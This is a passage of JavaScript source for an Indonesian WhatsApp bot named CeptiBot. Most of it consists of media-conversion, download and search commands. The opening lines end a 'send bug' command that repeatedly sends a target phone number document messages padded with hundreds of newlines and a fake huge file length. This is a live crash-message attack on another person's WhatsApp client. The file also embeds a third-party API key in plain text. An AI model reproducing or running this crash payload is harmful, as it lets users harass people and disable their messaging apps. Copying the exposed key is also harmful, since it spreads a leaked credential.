fileName: `🔥 CEPTIBOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: thumb, 
fileLength: "999999999", 
mentions:[sender] }, {quoted:m})
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
	case 'tomp4': case 'tovideo': {
 
    if (isBan) return reply(mess.banned)
    if (checklimitUser(sender) <= 0) return reply(limitabis)  
if (!quoted) return reply( 'Reply Image')
if (!/webp/.test(mime)) return reply( `balas stiker dengan caption *${prefix + command}*`)
reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
let media = await Cepti.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Cepti.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
}
confirmlimit(sender, 1)
break
case 'toaud': case 'toaudio': {
  
    if (isBan) return reply(mess.banned)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply( `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
if (!quoted) return reply( `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
Cepti.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tomp3': {
  
    if (isBan) return reply(mess.banned)
    if (checklimitUser(sender) <= 0) return reply(limitabis) 
if (/document/.test(mime)) return reply( `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply( `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return reply( `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
Cepti.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${` © ${setting.botName} bot`}.mp3`}, { quoted : m })
}
confirmlimit(sender, 1)
break
case 'tovn': case 'toptt': {
 
    if (isBan) return reply(mess.banned)
    if (checklimitUser(sender) <= 0) return reply(limitabis)  
if (!/video/.test(mime) && !/audio/.test(mime)) return reply( `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
if (!quoted) return reply( `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
Cepti.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
confirmlimit(sender, 1)
break
case 'togif': {
  
    if (isBan) return reply(mess.banned)
    if (checklimitUser(sender) <= 0) return reply(limitabis) 
if (!quoted) return reply( 'Reply Image')
if (!/webp/.test(mime)) return reply( `balas stiker dengan caption *${prefix + command}*`)
reply(mess.wait)
let { webp2mp4File } = require('./lib/uploader')
let media = await Cepti.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Cepti.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
}
confirmlimit(sender, 1)
break
	case 'tourl': {
  
    if (isBan) return reply(mess.banned)
    if (checklimitUser(sender) <= 0) return reply(limitabis) 
reply(mess.wait)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await Cepti.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
    let anu = await TelegraPh(media)
    reply(util.format(anu))
} else if (!/image/.test(mime)) {
    let anu = await UploadFileUgu(media)
    reply(util.format(anu))
}
await fs.unlinkSync(media)
}
confirmlimit(sender, 1)
break
case 'imagenobg': case 'removebg': case 'remove-bg': {
if (!isPremium) return sendButMessage (from, prem1, prem2, prem3, { quoted:ftex})

    if (isBan) return reply(mess.banned)
if (!quoted) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply( `Kirim/Reply Image Dengan Caption ${prefix + command}`)
let remobg = require('remove.bg')
let apirnobg = ['qpmjqVVpD6Ca5p6uo4MEDFRF']
let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
hmm = await './src/remobg-'+getRandom('')
localFile = await Cepti.downloadAndSaveMediaMessage(quoted, hmm)
outputFile = await './src/hremo-'+getRandom('.png')
reply(mess.wait)
remobg.removeBackgroundFromImageFile({
  path: localFile,
  apiKey: apinobg,
  size: "regular",
  type: "auto",
  scale: "100%",
  outputFile 
}).then(async result => {
Cepti.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
await fs.unlinkSync(localFile)
await fs.unlinkSync(outputFile)
})
}
break
case 'yts': case 'ytsearch': {

    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} story wa anime`)
reply(mess.wait)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
Cepti.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
confirmlimit(sender, 1)
break
case 'google2':
res = await ggs({'query' : `${q}`})
teks = "=============="
for (let i of res) {
teks += `judul: ${i.title}\n`
teks += `Link: ${i.link}\n`
teks += `Keterangan: ${i.snippet}\n`
}
teks += "=============="
reply(teks) 
break
case 'google': {
  
    if (isBan) return reply(mess.banned)
  if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} fatih arridho`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n=====================\n\n`
} 
reply(teks)
})
}
confirmlimit(sender, 1)
break
case 'manga':

    if (isBan) return reply(mess.banned)
 if ( checklimitUser(sender) <= 0) return reply(limitabis) 
  reply(mess.wait)
  const { Manga } =require("@shineiichijo/marika")

const manga = new Manga();

if(!q) return reply(`Manga apa yg kamu cari??\nExample ${prefix}manga naruto`)
let srh = await manga.searchManga(q)
    let mang = `• *Title: ${srh.data[0].title}*\n`;
    mang += `• *Status: ${srh.data[0].status}*\n`;
    mang += `• *Total Volumes: ${srh.data[0].volumes}*\n`;
    mang += `• *Total Chapters: ${srh.data[0].chapters}*\n`;
    mang += `• *Genres:*\n`;
    for (let i = 0; i < srh.data[0].genres.length; i++) {
 mang += `\t\t\t\t\t\t\t\t*${srh.data[0].genres[i].name}*\n`;
    }
    mang += `• *Published on: ${srh.data[0].published.from}*\n`;
    mang += `• *Score: ${srh.data[0].scored}*\n`;
    mang += `• *Popularity: ${srh.data[0].popularity}*\n`;
    mang += `• *Favorites: ${srh.data[0].favorites}*\n`;
    mang += `• *Authors:*\n`;
    for (let i = 0; i < srh.data[0].authors.length; i++) {
 mang += `\t\t\t\t\t\t\t\t\t*${srh.data[0].authors[i].name}* *(${srh.data[0].authors[0].type})*\n`;
    }
    mang += `\n• *URL: ${srh.data[0].url}*\n\n`;
    if (srh.data[0].background !== null)
 mang += `• *Background:* ${srh.data[0].background}`;
    mang += `• *Description:* ${srh.data[0].synopsis.replace(
 /\[Written by MAL Rewrite]/g,
 ""
    )}`;
Cepti.sendMessage(m.chat,{image:{url:srh.data[0].images.jpg.large_image_url},caption:mang},{quoted:m})  
confirmlimit(sender, 1)
break
case 'buylimit':

    if (isBan) return reply(mess.banned)
    if (!q) return reply(`Masukan Jumlah contoh:\n${prefix}buylimit 10\n\n*MAXIMAL PEMBELIAN LIMIT 10*`)
    if ( checkuangUser(sender) <= yaya) return reply(`maaf kak uang nya gak cukup, kumpulin uang nya dulu >_< `)
  if (args[0] === '1'){
  confirmuang(sender, yaya)
	addlimitUser(sender, 1)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '2') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 1)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '3') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 3)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '4') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 4)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '5') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 5)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '6') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 6)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '7') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 7)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '8') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 8)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '9') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 9)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '10') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 10)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else {
	 reply(`Maximal pembelian limit 10 kak`)
}
break
case 'atm':
  case 'uang':
case 'limit':

    if (isBan) return reply(mess.banned)
const kantong = checkuangUser(sender)
if (isPremium) return reply(`┏━━━━━━━[ *ATM* ]━━━━━━━┓\n┃╭───────────────────\n┃│➸ NAMA : ${pushname}\n┃│➸ NOMOR : ${sender.split("@")[0]}\n┃│➸ UANG : ${kantong}\n┃│➸ Limit : UNLIMITED\n┃╰───────────────────\n┗━━━━━━━━━━━━━━━━━━━━┛`)
Anjay =`┏━━━━━━━[ *ATM* ]━━━━━━━┓\n┃╭───────────────────\n┃│➸ NAMA : ${pushname}\n┃│➸ NOMOR : ${sender.split("@")[0]}\n┃│➸ UANG : ${kantong}\n┃│➸ Limit : ${checklimitUser(sender)}\n┃╰───────────────────\n┗━━━━━━━━━━━━━━━━━━━━┛`
reply(Anjay)
break
  case 'tes':
  case 'test':
    
    if (isBan) return reply(mess.banned)
  const buttons5 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: '⋮☰ MENU'}, type: 1}
]
const pahh = {
text: `Total Hit : ${totalhit}\nHit Today : ${totalhittd}`,
footer: `© ${setting.botName} bot`,
buttons: buttons5,
headerType: 1
}
Cepti.sendMessage(from, pahh, {quoted:ftex})
break
case 'gimage': {
  
    if (isBan) return reply(mess.banned)
    if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( `Example : ${prefix + command} bakso malang`)
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: images },
    caption: `*「 GIMAGE SEARCH 」*
 *Query* : ${text}
 *Media Url* : ${images}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
})
}
confirmlimit(sender, 1)
break
  case 'pin2':
case 'pinterest2':
  
    if (isBan) return reply(mess.banned)
 if ( checklimitUser(sender) <= 0) return reply(limitabis) 
  if (!q) return reply(`Masukan Query Contoh: \n ${prefix}${command} Shinobu Kochou`)
  reply(mess.wait)
let pinh = await hx.pinterest(q)
let ach = pinh[Math.floor(Math.random() * pinh.length)]
let dis = await getBuffer(ach)
let buttonso = [
    {buttonId: `pin2 ${text}`, buttonText: {displayText: 'NEXT'}, type: 1}
]
let buttonMessage = {
    image: dis,
    caption: `*「 PINTEREST 」*
 *Query* : ${text}
 *Media Url* : ${ach}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttonso,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
confirmlimit(sender, 1)
break
case 'husbu':
  
    if (isBan) return reply(mess.banned)
  	if (checklimitUser(sender) <= 0) return reply(limitabis) 
  reply(mess.wait)
let pinht = await hx.pinterest('Husbu Anime')
let achl = pinht[Math.floor(Math.random() * pinht.length)]
let dist = await getBuffer(achl)
let buttonsol = [
    {buttonId: `husbu`, buttonText: {displayText: 'NEXT'}, type: 1}
]
let buttonMessageh = {
    image: dist,
    caption: `*Nih kak*`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttonsol,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessageh, { quoted: m })
confirmlimit(sender, 1)
break
case 'play': case 'ytplay': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
💌 Title : ${anu.title}
📦 Ext : Search
📮 Id : ${anu.videoId}
🪀 Duration : ${anu.timestamp}
🧾 Viewers : ${anu.views}
📥 Upload At : ${anu.ago}
📔 Author : ${anu.author.name}
🗞 Channel : ${anu.author.url}
🗂 Description : ${anu.description}
🔗 Url : ${anu.url}`,
footer: Cepti.name,
buttons: buttons,
headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'mediafire': {
if (isBan) return reply(mess.banned)
if (!text) return reply(mess.linkna)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`Link invalid!!`)
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `*MEDIAFIRE DOWNLOADER*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
reply(`${result4}`)
Cepti.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
case 'zippyshare': case 'zippydl': {
	
    if (isBan) return reply(mess.banned)
  if ( checklimitUser(sender) <= 0) return reply(limitabis) 
                if (!text) throw `Example : ${prefix + command} https://www69.zippyshare.com/v/MRLWO4qB/file.html#!/N27zvKSgDG46JQ6`
                let anu = await zippyDownloader(isUrl(text)[0])
                if (Number(anu.size.split("MB")[0]) >= 40.00) return m.reply('File Melebihi Batas '+util.format(result))
                Cepti.sendText(m.chat, util.format(anu), m)
                Cepti.sendMedia(m.chat, anu.link, '', m)
            }
            break
case 'igstory':

    if (isBan) return reply(mess.banned)
if (!args[0]) return reply(`Nickname nya? Contoh :\n${prefix + command} Yukishima3_`)
hx.igstory(q)
.then(async result => {
for(let i of result.medias){
if(i.url.includes('mp4')){
Cepti.sendMessage(from, {video:{url:i.url}, caption:`Type : ${i.type}`, mimetype:'video/mp4'}, {quoted:m})
} else {
  Cepti.sendMessage(from, {image:{url:i.url}, caption:`Type : ${i.type}`}, {quoted:m})
}}});
   break
  case 'image':
    
    if (isBan) return reply(mess.banned)
  if (!q) return reply(`Masukan linknya`)
  try {
    reply(mess.wait)
  Cepti.sendMessage(from, {image:{url:args[0]}, caption:' © Powered by CeptiBotZ 💌'}, {quoted:m})
  } catch {
reply("Linknya Error")
}
break
case 'kalkulator':
 case 'kal':
   
    if (isBan) return reply(mess.banned)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply('Kamu sedang bermain kuis math tidak dapat menggunakan fitur k')
    if (args.length < 1) return reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
reply('Error')
} else {
reply(`「 *Kalkulator* 」\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
break
case 'twitter':{

if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (isBan) return reply(mess.banned)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('twitter')) return reply(`Link Invalid!!`)
reply(mess.wait)
anunya = await x.downloader.twitter(q)
Cepti.sendMessage(from, { video: { url: anunya.quality_720}, caption: anunya.caption }, { quoted: m })
confirmlimit(sender, 1)
}
break
case 'igdl': case 'instagram':{
const instagramGetUrl = require("instagram-url-direct")
const results = (await instagramGetUrl(q)).url_list[0]
console.log(results)
}
break
case 'tiktok':{ 
if (!text) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
m.reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
    var button = [{ buttonId: `tiktokaudio`, buttonText: { displayText: `AUDIO‡` }, type: 1 }, { buttonId: `owner`, buttonText: { displayText: `OWNER‡` }, type: 1 }]
Cepti.sendMessage(m.chat, { caption: 'Tu Video Nya', video: { url: data.watermark }, buttons: button, footer: `© 𝕯𝖎𝖉𝖎𝖓𝕭𝖔𝖙𝖟‡`, mentions: [sender] })
})
}
break
case 'tiktokaudio':{
  
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (isBan) return reply(mess.banned)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
Cepti.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
confirmlimit(sender, 1)
})
}
break
case 'tiktok':{

if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (isBan) return reply(mess.banned)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
let bton = [{
urlButton: {
displayText: 'SOURCE',
url: q
}
}, {
quickReplyButton: {
displayText: 'NO WATERMARK',
id: `tiktoknowm ${q}`
}
}, {
quickReplyButton: {
displayText: 'AUDIO',
id: `tiktokaudio ${q}`
}
}]
Cepti.sendMessage(from, { caption: 'Kamu bisa mengubahnya menjadi Vidio Tanpa Watermark atau Audio, pencet tombol dibawah untuk mengubahnya!', video: { url: data.watermark }, templateButtons: bton, footer: `© ${setting.botName} bot`, mentions: [sender] })
confirmlimit(sender, 1)
})
}
break
case 'fbdl':
case 'facebook':{

if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (isBan) return reply(mess.banned)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('facebook.com')) return reply(`Link Invalid!!`)
reply(mess.wait)
const { fbdl } = require("./lib/facebook");
fbdl(q).then( data => {
if (data.length == 0) return reply(`Maaf terjadi kesalahan, ganti link yang lain!`)
Cepti.sendMessage(from, { video: { url: data[data.length - 1] }, caption: data.title }, { quoted: m })
confirmlimit(sender, 1)
})
}
break
case 'ytmp3': {
                if (!text) throw `Example: ytmp4 https://youtu.be/BkBL0Rx-Dtw`
               let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                    if (!urls) throw `Link yang ada masukan mungkin bukan url youtube`
                m.reply(`SABAR YAAAA....`)
                anu = await ytMp3(text)
                
              if (Number(anu.size.split("MB")[0]) >= 9000) return m.reply('File Melebihi Batas '+util.format(anu))
                Cepti.sendImage(m.chat, `${anu.thumb}`, `Title: ${anu.title}\n Channel: ${anu.channel}\n Like: ${anu.likes}\n Dislike: ${anu.dislike}\n Views: ${anu.views}\nQuality: ${anu.quality}\n Size: ${anu.size}\n Upload: ${anu.uploadDate}\nDesc: ${anu.desc}`, m)
                Cepti.sendMessage(m.chat, { audio: { url: anu.result }, mimetype: 'audio/mp4', fileName: `${anu.title}.mp3\n\nFile akan di kirim mohon sabar` }, { quoted: m })
                }
                break
    case 'ytmp4': {
            if (!text) throw `Example: ytmp4 https://youtu.be/BkBL0Rx-Dtw`
           let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Link yang ada masukan mungkin bukan url youtube`
            m.reply(`SABAR TOLOL ....`)
            anu = await ytMp4(text)
                    if (Number(anu.size.split("MB")[0]) >= 9000) return m.reply('File Melebihi Batas '+util.format(anu))
            Cepti.sendMessage(m.chat, { video: { url: anu.result }, fileName: `${anu.title}.mp4`, mimetype: 'video/mp4', caption: `💌Title: ${anu.title}\n ✉️Channel: ${anu.channel}\n 👍Like: ${anu.likes}\n 👎Dislike: ${anu.dislike}\n 🙀Views: ${anu.views}\n😎Quality: ${anu.quality}\n 😤Size: ${anu.size}\n 📥Upload: ${anu.uploadDate}\n📮Desc: ${anu.desc}` }, { quoted: m })
            }
            break
confirmlimit(sender, 1)
break
  case 'getmusic': {

    if (isBan) return reply(mess.banned)
if (!text) return reply( `Example : ${prefix + command} 1`)
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) return reply( `Hanya Bisa Membalas Pesan Dari Bot`)
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return reply( `Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
reply(mess.wait)
data = await caliph.downloader.youtube.ytmp4(urls[text - 1])
var nme = `./tempat/${Date.now()}.mp4`
 fs.writeFileSync(nme, await getBuffer(data.result))
 var ran = './tempat/'+getRandom('.mp3')
 exec(`ffmpeg -i ${nme} ${ran}`, async (err) => {
 Cepti.sendMessage(from, { audio: fs.readFileSync(ran), mimetype: 'audio/mp4', fileName: `${data.title}.mp3` }, { quoted: m })
fs.unlinkSync(nme)
fs.unlinkSync(ran)
 })
 confirmlimit(sender, 1)
}
break 
case 'getvideo': {

    if (isBan) return reply(mess.banned)
if (!text) return reply( `Example : ${prefix + command} 1`)
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) return reply( `Hanya Bisa Membalas Pesan Dari Bot`)
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return reply( `Mungkin pesan yang anda reply tidak mengandung result ytsearch`)
reply(mess.wait)
data = await caliph.downloader.youtube.ytmp4(urls[text - 1])
Cepti.sendMessage(from, { video: await getBuffer(data.result), caption: data.title }, { quoted: m })
confirmlimit(sender, 1)
}
break
case 'pinterest': 
  case 'pin':

    if (isBan) return reply(mess.banned)
if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!q) return reply(`Masukan Query Contoh : \n${prefix}pinterest Vestia Zeta`)
	reply(mess.wait)
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
pinnya = await getBuffer(result)
  let btn99 = [{
urlButton: {
displayText: 'SOURCE IMAGE',
url: result
}
}, {
quickReplyButton: {
displayText: 'NEXT',
id: `pin ${q}`
}
}]
karutachi = pinnya
let txt99 = `Result : ${q}`
Cepti.send5ButImg(from, txt99, `© ${setting.botName} bot`, karutachi, btn99)
confirmlimit(sender, 1)
break
case 'couple': {
 
    if (isBan) return reply(mess.banned)
reply(mess.wait)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
Cepti.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
Cepti.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
}
break
case 'coffe': case 'kopi': {
  
    if (isBan) return reply(mess.banned)
  reply(mess.wait)
let buttons = [
    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: 'https://coffee.alexflipnote.dev/random' },
    caption: `☕ Random Coffe`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
case 'wallpaper': {

    if (isBan) return reply(mess.banned)
  if ( checklimitUser(sender) <= 0) return reply(limitabis)  
if (!text) return reply( 'Masukkan Query Title')
reply(mess.wait)
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: result.image[0] },
    caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttons,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
confirmlimit(sender, 1)
break
case 'wallnime': {
  
    if (isBan) return reply(mess.banned)
	if (checklimitUser(sender) <= 0) return reply(limitabis) 
  reply(mess.wait)
anu = await wallpaper(`Anime`)
result = anu[Math.floor(Math.random() * anu.length)]
let buttonsu = [
    {buttonId: `wallnime`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: result.image[0] },
    caption: `⭔ Title : ${result.title}`,
    footer: ` © ${setting.botName} bot`,
    buttons: buttonsu,
    headerType: 4
}
Cepti.sendMessage(m.chat, buttonMessage, { quoted: m })
}
confirmlimit(sender, 1)
break
case 'wiki':
case 'wikipedia':
if (args.length < 1) return reply('What Are You Looking For?? ')
const res2 = await CeptiWiki(q).catch(e => {
return reply('_[ ! ] Error Result Not Found_') 
}) 
result2 = `*Title :* ${res2[0].judul}\n*Wiki :* ${res2[0].wiki}`
Cepti.sendMessage(from, { image : { url : res2[0].thumb }, caption : result2}) 
break
case 'wikimedia': {
  
    if (isBan) return reply(mess.banned)
  if ( checklimitUser(sender) <= 0) return reply(limitabis) 
if (!text) return reply( 'Masukkan Query Title')
reply(mess.wait)
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
    image: { url: result.image },
